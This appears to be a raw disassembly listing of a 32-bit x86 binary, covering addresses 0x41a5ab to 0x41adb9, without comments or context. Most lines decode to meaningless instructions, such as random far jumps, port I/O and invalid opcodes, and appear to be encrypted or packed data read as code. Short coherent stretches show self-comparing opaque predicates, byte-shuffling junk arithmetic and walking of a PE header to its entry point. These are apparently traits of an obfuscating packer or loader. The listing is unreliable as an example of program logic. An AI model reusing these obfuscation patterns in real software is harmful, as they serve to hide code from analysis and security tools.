  41a5ab:	xchg   DWORD PTR [ecx-0xd],esi
  41a5ae:	mov    ds:0xf364e056,al
  41a5b3:	pop    edi
  41a5b4:	mov    ebx,DWORD PTR ds:0xb1c2c83c
  41a5ba:	push   edx
  41a5bb:	xchg   ebx,eax
  41a5bc:	jne    0x41a552
  41a5be:	jb     0x41a5c9
  41a5c0:	lock mov edx,DWORD PTR [esp+0x1c]
  41a5c5:	shrd   ecx,edx,0x2
  41a5c9:	xor    ecx,eax
  41a5cb:	mov    eax,DWORD PTR [esp+0x18]
  41a5cf:	shl    eax,0x1e
  41a5d2:	shr    edx,0x2
  41a5d5:	mov    edx,DWORD PTR [esp+0x1c]
  41a5d9:	xor    eax,eax
  41a5db:	or     eax,ecx
  41a5dd:	mov    ecx,DWORD PTR [esp+0x68]
  41a5e1:	mov    DWORD PTR [ecx],eax
  41a5e3:	mov    eax,DWORD PTR [esp+0x68]
  41a5e7:	mov    ecx,DWORD PTR [esp+0x68]
  41a5eb:	mov    eax,DWORD PTR [eax]
  41a5ed:	cmp    eax,DWORD PTR [ecx]
  41a5ef:	jne    0x41a916
  41a5f5:	mov    eax,DWORD PTR [esp+0x5c]
  41a5f9:	mov    ecx,DWORD PTR [esp+0x5c]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	cmp    eax,DWORD PTR [ecx]
  41a601:	jne    0x41a916
  41a607:	mov    BYTE PTR [esp+0x2c],0x20
  41a60c:	mov    BYTE PTR [esp+0x38],0x3
  41a611:	jmp    0x41a86e
  41a616:	cs lock pop ebp
  41a619:	jne    0x41a5ba
  41a61b:	js     0x41a653
  41a61d:	mov    eax,0x90d3c3ca
  41a622:	inc    esp
  41a623:	xor    esp,DWORD PTR [esi-0x2f]
  41a626:	jl     0x41a64b
  41a628:	sar    BYTE PTR [esi-0x41413dcb],0xfe
  41a62f:	popf   
  41a630:	imul   ebx,ecx,0x1e990c71
  41a636:	int3   
  41a637:	fld    QWORD PTR [esi+ebp*2]
  41a63a:	push   0x37
  41a63c:	mov    cl,0xb5
  41a63e:	mov    ebx,0x64c8e807
  41a643:	push   cs
  41a644:	jle    0x41a64c
  41a646:	mov    WORD PTR [ebx-0x181978f0],es
  41a64c:	pop    eax
  41a64d:	outs   dx,BYTE PTR ds:[esi]
  41a64e:	fidivr DWORD PTR [edx+0x32]
  41a651:	pusha  
  41a652:	pop    ebx
  41a653:	hlt    
  41a654:	mov    ds,WORD PTR [edi+0x3b]
  41a657:	push   esi
  41a658:	sub    BYTE PTR [eax-0x3ada8180],ah
  41a65e:	cwde   
  41a65f:	jns    0x41a6bb
  41a661:	push   edi
  41a662:	addr16 push edi
  41a664:	cs gs enter 0x91e9,0xa9
  41a66a:	add    eax,0xf89a55eb
  41a66f:	sbb    BYTE PTR [esi+0x63348249],cl
  41a675:	test   BYTE PTR [esi+0x6035c141],0x49
  41a67c:	or     ecx,ebx
  41a67e:	fimul  WORD PTR [edx-0x68]
  41a681:	leave  
  41a682:	sbb    BYTE PTR [esi],dl
  41a684:	mov    bl,0x8c
  41a687:	push   eax
  41a688:	fld    DWORD PTR [ecx-0x1d57d878]
  41a68e:	pop    ebp
  41a68f:	jno    0x41a69b
  41a691:	and    DWORD PTR [esi+0x7a6ad5ea],ebx
  41a697:	aad    0x73
  41a699:	ss pop esi
  41a69b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a69c:	push   edx
  41a69d:	sbb    DWORD PTR [ecx+0x4dbfb2d6],ecx
  41a6a3:	mov    al,ds:0x142e5a39
  41a6a8:	and    cl,BYTE PTR ds:0xdef92beb
  41a6ae:	loop   0x41a658
  41a6b0:	test   DWORD PTR [edx+0x493462fe],ebx
  41a6b6:	adc    esp,DWORD PTR [ebx-0x6]
  41a6b9:	out    0xa7,al
  41a6bb:	call   0xd65bd015
  41a6c0:	add    al,0xc3
  41a6c2:	ss call 0xbf72:0x523af3a9
  41a6ca:	mov    dh,0x7a
  41a6cc:	popf   
  41a6cd:	daa    
  41a6ce:	(bad)  
  41a6cf:	jmp    FWORD PTR [edi-0x7ca026bb]
  41a6d5:	pop    edi
  41a6d6:	add    ch,bh
  41a6d8:	icebp  
  41a6d9:	xchg   esi,esi
  41a6db:	jnp    0x41a6e1
  41a6dd:	aad    0xc9
  41a6df:	mov    esp,0x4dc2cdc0
  41a6e4:	(bad)  
  41a6e6:	leave  
  41a6e7:	mov    dh,0x67
  41a6e9:	xor    edi,DWORD PTR fs:[eax]
  41a6ec:	scas   eax,DWORD PTR es:[edi]
  41a6ed:	loopne 0x41a742
  41a6ef:	add    al,0x72
  41a6f1:	or     eax,0x8123df10
  41a6f6:	outs   dx,BYTE PTR ds:[esi]
  41a6f7:	ja     0x41a68f
  41a6f9:	xlat   BYTE PTR ds:[ebx]
  41a6fa:	xchg   DWORD PTR [edi],ecx
  41a6fc:	pop    ds
  41a6fd:	push   es
  41a6fe:	adc    eax,0xbcb4153f
  41a703:	rcr    DWORD PTR [ecx],1
  41a705:	(bad)  
  41a706:	rcl    DWORD PTR [edx+eiz*8-0xed7d11f],0xac
  41a70e:	pushw  cs
  41a710:	and    al,0xc6
  41a712:	mov    ebp,0xc170db0c
  41a717:	sbb    al,BYTE PTR [ecx+0x13ca90ba]
  41a71d:	js     0x41a6b8
  41a71f:	mov    al,ds:0xa45542be
  41a724:	mov    WORD PTR ds:0xd2b99abb,ss
  41a72a:	dec    ebp
  41a72b:	jecxz  0x41a6c7
  41a72d:	push   edx
  41a72e:	retf   0x9474
  41a731:	retf   
  41a732:	xchg   ebp,eax
  41a733:	lea    ebp,[ebx+0x7c]
  41a736:	ds mov dh,0x88
  41a739:	(bad)  
  41a73a:	pop    ecx
  41a73b:	in     al,0x80
  41a73d:	add    BYTE PTR [ebx*4-0x536e0c90],bh
  41a744:	outs   dx,DWORD PTR ds:[esi]
  41a745:	mov    ah,0xbb
  41a747:	shl    BYTE PTR [esi+0x6a],cl
  41a74a:	inc    ebx
  41a74b:	pushf  
  41a74c:	jecxz  0x41a763
  41a74e:	mov    bh,0xc7
  41a750:	into   
  41a751:	ret    0xbea3
  41a754:	or     BYTE PTR [ebx+edx*2+0x20],dh
  41a758:	loope  0x41a7d9
  41a75a:	cli    
  41a75b:	add    eax,0xbdb433cf
  41a760:	cmp    BYTE PTR ds:[edi+0x2a68b6],0x66
  41a768:	mov    ds:0x47c4654c,eax
  41a76d:	sbb    eax,0x95a19e77
  41a772:	mov    cl,0x3c
  41a774:	jp     0x41a773
  41a776:	mov    dl,0xa5
  41a778:	cmc    
  41a779:	inc    edi
  41a77a:	jns    0x41a7c9
  41a77c:	std    
  41a77d:	or     DWORD PTR [edi],ecx
  41a77f:	rol    ebp,0x2d
  41a782:	ret    0xc1cd
  41a785:	fimul  WORD PTR [esi-0x152f61e6]
  41a78b:	jl     0x41a7d0
  41a78d:	repnz sub DWORD PTR [ecx-0x37],ebp
  41a791:	dec    ecx
  41a792:	lock (bad) 
  41a794:	(bad)  
  41a796:	in     eax,dx
  41a797:	outs   dx,BYTE PTR ds:[esi]
  41a798:	rol    BYTE PTR [ebx],0xcb
  41a79b:	xor    esp,edx
  41a79d:	mov    edx,0x8159a155
  41a7a2:	outs   dx,DWORD PTR ds:[esi]
  41a7a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7a4:	mov    ds:0x9050cdaa,al
  41a7a9:	sbb    dl,cl
  41a7ab:	test   al,0x45
  41a7ad:	mov    bl,dl
  41a7af:	jge    0x41a79a
  41a7b1:	inc    edx
  41a7b2:	scas   eax,DWORD PTR es:[edi]
  41a7b3:	add    DWORD PTR [eax+edi*8+0x4940792e],esp
  41a7ba:	xchg   DWORD PTR [eax+0x522bbed0],esi
  41a7c0:	xchg   edx,eax
  41a7c1:	in     al,dx
  41a7c2:	sbb    dh,0xdd
  41a7c5:	jge    0x41a776
  41a7c7:	push   ss
  41a7c8:	loope  0x41a7f7
  41a7ca:	sbb    al,0xd2
  41a7cc:	mov    ds,ebx
  41a7ce:	push   es
  41a7cf:	push   eax
  41a7d0:	xchg   edx,eax
  41a7d1:	cwde   
  41a7d2:	lods   al,BYTE PTR ds:[esi]
  41a7d3:	adc    al,0xc9
  41a7d5:	mov    eax,ds:0x4c4a24ad
  41a7da:	les    ecx,FWORD PTR [ecx+0x15]
  41a7dd:	inc    ebp
  41a7df:	push   es
  41a7e0:	fst    QWORD PTR [edi-0x15e856ff]
  41a7e6:	lea    edx,[ecx+0x6b23f2b]
  41a7ec:	stos   BYTE PTR es:[edi],al
  41a7ed:	adc    ebp,ebx
  41a7ef:	ins    BYTE PTR es:[edi],dx
  41a7f0:	mov    BYTE PTR [edx-0xd23fd87],bh
  41a7f6:	outs   dx,DWORD PTR ds:[esi]
  41a7f7:	out    dx,al
  41a7f8:	faddp  st(1),st
  41a7fa:	jecxz  0x41a835
  41a7fc:	dec    edi
  41a7fd:	dec    esi
  41a7fe:	call   0xbf27:0xa17a615f
  41a805:	sub    al,0xde
  41a807:	mov    ebx,0x6ede7cd7
  41a80c:	push   esp
  41a80d:	cmp    al,0x3e
  41a80f:	leave  
  41a810:	mov    DWORD PTR [eax+0x306bf25e],esp
  41a816:	mov    ebx,0xd910027b
  41a81b:	out    dx,eax
  41a81c:	mov    ch,0xb4
  41a81e:	xor    DWORD PTR [edx-0x342d36f8],esp
  41a824:	push   eax
  41a825:	ror    BYTE PTR [esi+0x6798fcb5],1
  41a82b:	push   esi
  41a82c:	in     al,0xde
  41a82e:	push   edi
  41a82f:	xchg   edx,eax
  41a830:	aad    0x96
  41a832:	dec    edx
  41a833:	and    esp,DWORD PTR [ebx+eiz*8-0x61429ef8]
  41a83a:	sar    DWORD PTR [ecx],cl
  41a83c:	lds    ebp,FWORD PTR [ebx+edi*8+0x28]
  41a840:	inc    ebp
  41a841:	hlt    
  41a842:	add    BYTE PTR [esi-0x2c9929ba],cl
  41a848:	mov    ch,0xf2
  41a84a:	pop    eax
  41a84b:	out    dx,al
  41a84c:	xor    DWORD PTR [ebp-0x6b3b63f7],esp
  41a852:	je     0x41a807
  41a854:	dec    edx
  41a855:	bound  esp,QWORD PTR [edx-0x6eccd3ce]
  41a85b:	push   edi
  41a85c:	inc    ebp
  41a85d:	mov    ah,BYTE PTR [edx-0x3b]
  41a860:	jae    0x41a7fd
  41a862:	int3   
  41a863:	sbb    BYTE PTR [ebp-0x68],bh
  41a866:	add    cl,BYTE PTR [edi-0x3c]
  41a869:	sti    
  41a86a:	pop    esi
  41a86b:	mov    edi,0x44c698ab
  41a870:	and    al,0x3c
  41a872:	ins    DWORD PTR es:[edi],dx
  41a873:	mov    BYTE PTR [esp+0x2b],0x90
  41a878:	mov    al,BYTE PTR [esp+0x2b]
  41a87c:	mov    cl,BYTE PTR [esp+0x3c]
  41a880:	or     al,0xdc
  41a882:	sub    al,cl
  41a884:	mov    cl,BYTE PTR [esp+0x38]
  41a888:	sub    al,0x56
  41a88a:	movzx  eax,al
  41a88d:	movzx  ecx,cl
  41a890:	cdq    
  41a891:	idiv   ecx
  41a893:	movzx  ecx,BYTE PTR [esp+0x2c]
  41a898:	or     eax,ecx
  41a89a:	mov    BYTE PTR [esp+0xc],al
  41a89e:	mov    BYTE PTR [esp+0x24],0x1
  41a8a3:	mov    BYTE PTR [esp+0x2b],0xcf
  41a8a8:	mov    BYTE PTR [esp+0x3c],0x6
  41a8ad:	mov    BYTE PTR [esp+0x38],0x25
  41a8b2:	mov    BYTE PTR [esp+0x2c],0xf8
  41a8b7:	mov    al,BYTE PTR [esp+0x2c]
  41a8bb:	mov    cl,BYTE PTR [esp+0x38]
  41a8bf:	or     al,0xc4
  41a8c1:	and    al,cl
  41a8c3:	mov    cl,BYTE PTR [esp+0x3c]
  41a8c7:	imul   cl
  41a8c9:	mov    cl,BYTE PTR [esp+0x2b]
  41a8cd:	movzx  ecx,cl
  41a8d0:	movzx  eax,al
  41a8d3:	and    eax,ecx
  41a8d5:	mov    cl,BYTE PTR [esp+0x24]
  41a8d9:	movzx  ecx,cl
  41a8dc:	cdq    
  41a8dd:	idiv   ecx
  41a8df:	mov    cl,BYTE PTR [esp+0xc]
  41a8e3:	cmp    cl,al
  41a8e5:	je     0x41a93c
  41a8eb:	lea    eax,[esp+0x9c]
  41a8f2:	push   eax
  41a8f3:	lea    edi,[esp+0x80]
  41a8fa:	call   0x40b68c
  41a8ff:	cmp    eax,ebx
  41a901:	jne    0x41a93c
  41a907:	cmp    edx,esi
  41a909:	jne    0x41a93c
  41a90f:	xor    eax,eax
  41a911:	jmp    0x41b43e
  41a916:	mov    eax,DWORD PTR [esp+0x70]
  41a91a:	mov    ecx,DWORD PTR [esp+0x74]
  41a91e:	mov    edx,DWORD PTR [esp+0x18]
  41a922:	mov    edi,DWORD PTR [esp+0x1c]
  41a926:	add    eax,edx
  41a928:	adc    ecx,edi
  41a92a:	mov    DWORD PTR [esp+0x18],eax
  41a92e:	mov    DWORD PTR [esp+0x1c],ecx
  41a932:	jmp    0x41a93c
  41a937:	mov    ebx,0xcb79b576
  41a93c:	push   0x4
  41a93e:	push   0x422728
  41a943:	lea    eax,[esp+0x6c]
  41a947:	push   eax
  41a948:	call   0x411c08
  41a94d:	mov    eax,DWORD PTR [esp+0x64]
  41a951:	push   0x4
  41a953:	push   DWORD PTR [eax+0x1a4]
  41a959:	lea    eax,[esp+0x74]
  41a95d:	push   eax
  41a95e:	call   0x411c08
  41a963:	mov    eax,DWORD PTR [esp+0x64]
  41a967:	mov    eax,DWORD PTR [eax+0x1a4]
  41a96d:	mov    eax,DWORD PTR [eax]
  41a96f:	mov    ecx,DWORD PTR [esp+0x64]
  41a973:	mov    eax,DWORD PTR [eax+0x3c]
  41a976:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41a97c:	mov    ecx,DWORD PTR [ecx]
  41a97e:	lea    eax,[ecx+eax*1+0x28]
  41a982:	mov    eax,DWORD PTR [eax]
  41a984:	add    DWORD PTR [esp+0x6c],eax
  41a988:	mov    DWORD PTR [esp+0x30],0x127
  41a990:	mov    DWORD PTR [esp+0x10],0x421a
  41a998:	mov    eax,DWORD PTR [esp+0x10]
  41a99c:	jmp    0x41abf9
  41a9a1:	add    BYTE PTR [edx-0x4b9c4ca1],al
  41a9a7:	adc    al,0xb2
  41a9a9:	sub    eax,0x9bd15a28
  41a9ae:	aam    0x7c
  41a9b0:	xchg   edx,eax
  41a9b1:	repz sub eax,eax
  41a9b4:	mov    esi,0xbebec235
  41a9b9:	loopne 0x41a9dd
  41a9bb:	mov    cl,0xda
  41a9bd:	mov    ebp,0x1f1d9943
  41a9c2:	push   cs
  41a9c3:	xchg   edi,eax
  41a9c4:	dec    esp
  41a9c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9c6:	jmp    0xecf3:0x4f6483d9
  41a9cd:	aad    0x8b
  41a9cf:	(bad)  
  41a9d1:	push   cs
  41a9d2:	frstor [ebp-0x70]
  41a9d5:	les    ecx,FWORD PTR [edi]
  41a9d7:	cdq    
  41a9d8:	and    eax,edi
  41a9da:	xor    eax,DWORD PTR [esi]
  41a9dc:	gs mov eax,0x20e72aba
  41a9e2:	xchg   BYTE PTR [eax+edi*8-0x4],cl
  41a9e6:	call   0x32ce052
  41a9eb:	(bad)  
  41a9ed:	aaa    
  41a9ee:	or     BYTE PTR [eax+0x20],0x59
  41a9f2:	or     BYTE PTR [esi+0x9df1af6],dh
  41a9f8:	shl    BYTE PTR [ebx],cl
  41a9fa:	mov    cs,WORD PTR [ebx+0x6ce98bc1]
  41aa00:	mov    ds:0xf60c876a,al
  41aa05:	pop    ecx
  41aa06:	jle    0x41aa12
  41aa08:	mov    bh,0x58
  41aa0a:	fisttp QWORD PTR [edx]
  41aa0c:	jl     0x41a9d2
  41aa0e:	fst    QWORD PTR [ebx]
  41aa10:	inc    edi
  41aa11:	dec    esi
  41aa12:	pop    eax
  41aa13:	add    BYTE PTR [esi],bl
  41aa15:	leave  
  41aa16:	loopne 0x41a9df
  41aa18:	out    0x38,eax
  41aa1a:	ins    BYTE PTR es:[edi],dx
  41aa1b:	xor    ah,dl
  41aa1d:	mov    dh,BYTE PTR [ebp-0x5e4acf7c]
  41aa23:	mov    bh,BYTE PTR [ebx+0x2e]
  41aa26:	mov    ch,0x5e
  41aa28:	pop    edi
  41aa29:	ficomp DWORD PTR [ebp-0x10]
  41aa2c:	clc    
  41aa2d:	adc    eax,0x360ffcaa
  41aa32:	aam    0xc6
  41aa34:	cs std 
  41aa36:	shl    BYTE PTR [eax+0x7a],0xc3
  41aa3a:	xchg   esp,eax
  41aa3b:	cmp    edx,ebp
  41aa3d:	add    ecx,edx
  41aa3f:	sbb    ch,bh
  41aa41:	fcomp  QWORD PTR [edx+0x3a]
  41aa44:	xlat   BYTE PTR ds:[ebx]
  41aa45:	repnz mov ds:0xdc06664b,eax
  41aa4b:	(bad)  
  41aa4d:	cmp    bh,ch
  41aa4f:	daa    
  41aa50:	push   0x145fcaef
  41aa55:	jbe    0x41aaca
  41aa57:	adc    ebx,DWORD PTR ds:0x71e9b18d
  41aa5d:	xor    DWORD PTR [ebx-0x418ebe9f],ebx
  41aa63:	xchg   ecx,eax
  41aa64:	out    dx,al
  41aa65:	xchg   esi,eax
  41aa66:	data16 mov al,ds:0x53c43d29
  41aa6c:	mov    dl,bl
  41aa6e:	push   esp
  41aa6f:	imul   eax,DWORD PTR [ebx],0x24
  41aa72:	inc    ebp
  41aa73:	and    bl,BYTE PTR [esi+0x430a3f93]
  41aa79:	xchg   BYTE PTR [eax-0x32],ah
  41aa7c:	shr    BYTE PTR [edi],cl
  41aa7e:	or     ebx,DWORD PTR [ebx]
  41aa80:	jg     0x41aa71
  41aa82:	pop    esp
  41aa83:	retf   0xf565
  41aa86:	jmp    0x10729d4e
  41aa8b:	pop    ebp
  41aa8c:	icebp  
  41aa8d:	jb     0x41aa5e
  41aa8f:	lods   eax,DWORD PTR ds:[esi]
  41aa90:	lea    ecx,[ebx+edi*2-0x64284cce]
  41aa97:	jns    0x41aa25
  41aa99:	inc    eax
  41aa9a:	push   ss
  41aa9b:	iret   
  41aa9c:	or     al,bl
  41aa9e:	mov    eax,ds:0xc87d1fa6
  41aaa3:	mov    edx,0xd8e9f941
  41aaa8:	inc    edi
  41aaa9:	mov    al,ds:0xa5d31365
  41aaae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aaaf:	outs   dx,DWORD PTR ds:[esi]
  41aab0:	into   
  41aab1:	jns    0x41ab20
  41aab3:	sub    dh,dl
  41aab5:	xchg   edi,eax
  41aab6:	mov    dh,0x9a
  41aab8:	dec    BYTE PTR [edx-0x7]
  41aabb:	dec    ecx
  41aabc:	jno    0x41aa74
  41aabe:	sub    DWORD PTR [eax+eax*8],0x72226e2f
  41aac5:	nop
  41aac6:	add    edi,DWORD PTR [ecx+0x38]
  41aac9:	je     0x41aad4
  41aacb:	test   eax,0x8e9c8f09
  41aad0:	adc    ebp,DWORD PTR [edi]
  41aad2:	mov    dl,0xbc
  41aad4:	push   0xffffff97
  41aad6:	leave  
  41aad7:	add    bh,BYTE PTR [ecx-0x356362cc]
  41aadd:	pop    edi
  41aade:	cmp    al,0xaf
  41aae0:	lahf   
  41aae1:	push   eax
  41aae2:	mov    WORD PTR [eax],ss
  41aae4:	ror    BYTE PTR [ebp-0x5db1cb49],0xc
  41aaeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaec:	clc    
  41aaed:	adc    eax,0xf69e1ecd
  41aaf2:	in     al,dx
  41aaf3:	call   0xe9bc342a
  41aaf8:	mov    dh,0x4c
  41aafa:	cmp    eax,0x3a8c45dd
  41aaff:	inc    esp
  41ab00:	imul   ebx,ebp,0xffffff9e
  41ab03:	mov    ecx,0x62211ea6
  41ab08:	xor    edx,ebx
  41ab0a:	xor    eax,0xee8b659c
  41ab0f:	push   0xffffffbe
  41ab11:	inc    ecx
  41ab12:	inc    ebx
  41ab13:	fcomp  DWORD PTR cs:[ebp+0x2acbdf7c]
  41ab1a:	repz xor al,0x3a
  41ab1d:	leave  
  41ab1e:	mov    al,BYTE PTR [edi-0x5839618c]
  41ab24:	mov    ds:0xe29a408,eax
  41ab29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab2a:	int    0xf7
  41ab2c:	push   0xc2cebace
  41ab31:	push   esp
  41ab32:	mov    esp,0x9d70c0d2
  41ab37:	das    
  41ab38:	inc    esi
  41ab39:	rol    DWORD PTR [bp+di-0x1d],0xd3
  41ab3e:	int    0xcf
  41ab40:	jmp    0x2ff88c72
  41ab45:	mov    DWORD PTR [ebx+ecx*4-0x60501a5c],edi
  41ab4c:	xchg   esp,eax
  41ab4d:	jne    0x41ab44
  41ab4f:	out    0x4a,eax
  41ab51:	fwait
  41ab52:	call   0x4326b3a0
  41ab57:	pop    edx
  41ab58:	arpl   WORD PTR [esi-0x5c],bx
  41ab5b:	cmc    
  41ab5c:	aam    0xde
  41ab5e:	or     edx,0xae11ccef
  41ab64:	call   0xecb3:0x320f74b6
  41ab6b:	pushf  
  41ab6c:	enter  0x7f03,0x81
  41ab70:	shl    DWORD PTR [esi+ecx*4+0x24],1
  41ab74:	mov    al,0x27
  41ab76:	outs   dx,DWORD PTR ds:[esi]
  41ab77:	rcr    DWORD PTR [ebx-0x7fd6dd61],0x2a
  41ab7e:	mov    al,ds:0x6d2eecf4
  41ab83:	inc    ebp
  41ab84:	test   al,0x45
  41ab86:	sar    DWORD PTR [eax-0x6540d81],1
  41ab8c:	jo     0x41ab67
  41ab8e:	xor    al,0x39
  41ab90:	fidivr WORD PTR [esi+edx*1+0x201a8b47]
  41ab97:	dec    edi
  41ab98:	xchg   ecx,eax
  41ab99:	mov    bl,0x39
  41ab9b:	sub    ch,dl
  41ab9d:	sti    
  41ab9e:	push   ecx
  41ab9f:	stc    
  41aba0:	jbe    0x41ab48
  41aba2:	aam    0x61
  41aba4:	xor    al,0x8f
  41aba6:	out    dx,al
  41aba7:	cmc    
  41aba8:	sti    
  41aba9:	hlt    
  41abaa:	sub    ch,cl
  41abac:	dec    eax
  41abad:	pop    esi
  41abae:	jle    0x41abdb
  41abb0:	xor    BYTE PTR ds:0x34e60a60,0xb
  41abb7:	adc    edi,DWORD PTR [esi+0x77]
  41abba:	xchg   BYTE PTR [esp+ecx*2+0x921c31d],ch
  41abc1:	and    al,0xd1
  41abc3:	cli    
  41abc4:	scas   eax,DWORD PTR es:[edi]
  41abc5:	mov    ebx,0xad2131d6
  41abca:	pop    eax
  41abcb:	mov    eax,ds:0x377f0cd2
  41abd0:	add    eax,0xd1bbe424
  41abd5:	test   ecx,0x67f42fdf
  41abdb:	xchg   DWORD PTR [eax+0x8386bb9],eax
  41abe1:	or     BYTE PTR [esi],bl
  41abe3:	push   0xfc20db46
  41abe8:	xor    DWORD PTR [esi*8-0x503b7590],edi
  41abef:	shl    edx,0xf8
  41abf2:	scas   eax,DWORD PTR es:[edi]
  41abf3:	or     edi,ecx
  41abf5:	jge    0x41aba0
  41abf7:	or     BYTE PTR [ecx-0x3dbbdb],al
  41abfd:	inc    DWORD PTR [ebx]
  41abff:	inc    esp
  41ac00:	and    al,0x30
  41ac02:	and    eax,0xfffffe5a
  41ac07:	jmp    0x41ae64
  41ac0c:	xor    DWORD PTR [edi-0x1f],ebp
  41ac0f:	frstor [esp+esi*2+0x1832b431]
  41ac16:	test   bh,cl
  41ac18:	or     DWORD PTR gs:[esi],edx
  41ac1b:	shr    DWORD PTR [ebx+0x2d],1
  41ac1e:	sar    BYTE PTR [esi-0x41413dcb],0xb6
  41ac25:	retf   0xdb2a
  41ac28:	mov    ebx,0xe1913729
  41ac2d:	xchg   ebx,eax
  41ac2e:	or     esi,eax
  41ac30:	test   BYTE PTR ds:0xa42a4702,0x1b
  41ac37:	test   esi,esi
  41ac39:	mov    BYTE PTR [edx],ch
  41ac3b:	jae    0x41abe5
  41ac3d:	test   DWORD PTR [ebx+eiz*2-0xa00c5de],ebp
  41ac44:	jb     0x41ac6c
  41ac46:	ror    BYTE PTR [esi-0x59118dec],cl
  41ac4c:	sub    eax,0xe99c3a3c
  41ac51:	sub    BYTE PTR [edx-0x6fb8c875],al
  41ac57:	aaa    
  41ac58:	xchg   esp,eax
  41ac59:	and    cl,BYTE PTR [eax+eiz*2-0x10]
  41ac5d:	mov    ebx,0x7d9c3a96
  41ac62:	leave  
  41ac63:	pop    ds
  41ac64:	cld    
  41ac65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac66:	and    bh,BYTE PTR fs:[eax+ebp*4+0x290d1c04]
  41ac6e:	rcl    ch,cl
  41ac70:	jb     0x41acb9
  41ac72:	popf   
  41ac73:	pushf  
  41ac74:	sub    al,0x2d
  41ac76:	mov    ebx,esi
  41ac78:	xchg   edi,eax
  41ac79:	mov    cl,0x6b
  41ac7b:	cmp    dh,BYTE PTR [edi]
  41ac7d:	cmp    ebp,DWORD PTR [eax-0x39]
  41ac80:	inc    ebp
  41ac81:	aam    0xbe
  41ac83:	mov    edx,0xa5327aad
  41ac88:	cs aam 0x1a
  41ac8b:	inc    esp
  41ac8c:	ins    DWORD PTR es:[edi],dx
  41ac8d:	cmp    ebp,DWORD PTR [ecx]
  41ac8f:	stos   BYTE PTR es:[edi],al
  41ac90:	push   esp
  41ac91:	sbb    ebp,esi
  41ac93:	or     BYTE PTR [ebp+esi*4-0x8819d4],0x10
  41ac9b:	lods   al,BYTE PTR ds:[esi]
  41ac9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac9d:	popf   
  41ac9e:	add    al,0xcc
  41aca0:	jmp    0x2279:0xa95b8694
  41aca7:	jmp    0x41ad08
  41aca9:	rcl    eax,0xc1
  41acac:	das    
  41acad:	xor    dl,BYTE PTR ds:0x171a4fba
  41acb3:	out    dx,eax
  41acb4:	icebp  
  41acb5:	adc    eax,0x32ed8b34
  41acba:	fadd   QWORD PTR gs:[esi-0x6b]
  41acbe:	inc    esi
  41acbf:	jl     0x41ac76
  41acc1:	xor    eax,DWORD PTR [edx+esi*8+0x8]
  41acc5:	loopne 0x41ac76
  41acc7:	mov    BYTE PTR ds:0xfe15b1f7,0xfc
  41acce:	aas    
  41accf:	cmc    
  41acd0:	sub    eax,0x3811558c
  41acd5:	stc    
  41acd6:	jge    0x41acdd
  41acd8:	js     0x41ac99
  41acda:	xor    dh,bl
  41acdc:	and    cl,BYTE PTR [ecx+0x2ad103b3]
  41ace2:	out    0xb4,eax
  41ace4:	mov    al,ds:0x4a33a6b
  41ace9:	mov    dh,0xc1
  41aceb:	push   es
  41acec:	pop    es
  41aced:	pusha  
  41acee:	inc    eax
  41acef:	out    0x7c,eax
  41acf1:	(bad)  
  41acf2:	push   ebx
  41acf3:	popf   
  41acf4:	test   eax,0x4502ce32
  41acf9:	mov    ch,BYTE PTR [edx+0x17]
  41acfc:	loope  0x41ac80
  41acfe:	jb     0x41ad04
  41ad00:	xchg   DWORD PTR [ecx-0x26054953],edi
  41ad06:	and    edx,DWORD PTR [eax]
  41ad08:	in     eax,dx
  41ad09:	sub    DWORD PTR [edi],edi
  41ad0b:	push   0xc77aa82b
  41ad10:	into   
  41ad11:	call   0xdc788c1f
  41ad16:	and    ebx,DWORD PTR [eax-0x34a9f159]
  41ad1c:	pop    ebx
  41ad1d:	pop    ecx
  41ad1e:	cld    
  41ad1f:	fiadd  WORD PTR [ebp+0x6]
  41ad22:	in     eax,dx
  41ad23:	daa    
  41ad24:	mov    dh,0xb2
  41ad26:	mov    esp,0x7ee1dd99
  41ad2b:	jns    0x41ad6d
  41ad2d:	nop
  41ad2e:	sub    esp,DWORD PTR [esi-0x5c]
  41ad31:	frstor [eax]
  41ad33:	dec    edi
  41ad34:	call   FWORD PTR [ebp+0x7d6a5096]
  41ad3a:	lock and BYTE PTR [esi-0x2d9b6621],0x2d
  41ad42:	hlt    
  41ad43:	cmp    eax,0x68b0775c
  41ad48:	xchg   edi,ebp
  41ad4a:	dec    esp
  41ad4b:	push   ecx
  41ad4c:	cmp    DWORD PTR [ecx],ebx
  41ad4e:	mov    ds:0x43a9bb23,al
  41ad53:	add    eax,0x82aab83e
  41ad58:	push   ss
  41ad59:	es sub eax,0xb6f2d8ad
  41ad5f:	popf   
  41ad60:	leave  
  41ad61:	outs   dx,DWORD PTR ds:[esi]
  41ad62:	int    0xd7
  41ad64:	xchg   edx,eax
  41ad65:	rcl    BYTE PTR [ebx],0xb5
  41ad68:	or     dh,al
  41ad6a:	adc    eax,DWORD PTR [eax]
  41ad6c:	or     ebp,ebp
  41ad6e:	fisttp DWORD PTR [esi-0x1d67490b]
  41ad74:	jae    0x41add5
  41ad76:	daa    
  41ad77:	and    eax,0xb6e25c60
  41ad7c:	call   0x65559a5c
  41ad81:	dec    ebp
  41ad83:	push   eax
  41ad84:	adc    bh,0xdf
  41ad87:	xor    al,BYTE PTR [ebx+edi*4-0x64ff8195]
  41ad8e:	push   ss
  41ad8f:	cmc    
  41ad90:	sub    BYTE PTR [edi],cl
  41ad92:	push   ebx
  41ad93:	or     BYTE PTR [ecx-0x10eefec2],0xd1
  41ad9a:	and    ah,BYTE PTR [ebx+0x7a]
  41ad9d:	ja     0x41ae0e
  41ad9f:	jae    0x41ad4a
  41ada1:	jo     0x41ad53
  41ada3:	push   cs
  41ada4:	cmp    esi,DWORD PTR [edi+eax*1]
  41ada7:	pushf  
  41ada8:	clc    
  41ada9:	add    esp,DWORD PTR [edi+0x66e91c60]
  41adaf:	test   al,0x6b
  41adb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adb2:	neg    ecx
  41adb4:	sbb    eax,0x5c681e5a
  41adb9:	push   ebx
